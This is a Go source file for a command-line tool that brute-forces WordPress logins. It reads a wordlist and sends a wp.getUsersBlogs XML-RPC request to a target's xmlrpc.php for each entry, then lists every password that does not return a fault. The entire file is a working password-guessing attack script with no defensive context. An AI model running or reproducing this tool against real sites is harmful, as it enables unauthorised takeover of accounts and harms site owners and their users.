package main

import (
    "bytes"
    "fmt"
    "net/http"
    "io"
    "log"
    "strings"
    "os"
    "bufio"
)

func main() {
	if(len(os.Args) != 4){
		fmt.Println("This needs three positional arguments, URL, user and wordlist")
		fmt.Println("Usage example: goxmlrpc https://www.example.com/xmlrpc.php username wordlist.txt")
		os.Exit(0)
	}
	f, err := os.Open(os.Args[3])

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	scanner := bufio.NewScanner(f)
	var passwords string
	for scanner.Scan() {
		body := "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + os.Args[2] + "</value></param><param><value>" + scanner.Text() + "</value></param></params></methodCall>"
		client := &http.Client{}
		req, err := http.NewRequest("POST", os.Args[1], bytes.NewBuffer([]byte(body)))
		if err != nil {
			fmt.Println(err)
		}
		req.Header.Add("Content-Type", "application/xml; charset=utf-8")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(err)
		}
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		bodyString := string(bodyBytes)
		fmt.Println(bodyString)
		if(strings.Contains(bodyString, "faultString")){
			fmt.Println(scanner.Text() + " is not the password")
		}else{
			fmt.Println(scanner.Text() + " Its a working password")
			passwords += scanner.Text() + "\n"
		}

		if err != nil {
		   log.Fatalln(err)
		}
		
	}
	fmt.Println("Passwords:\n" + passwords)

}
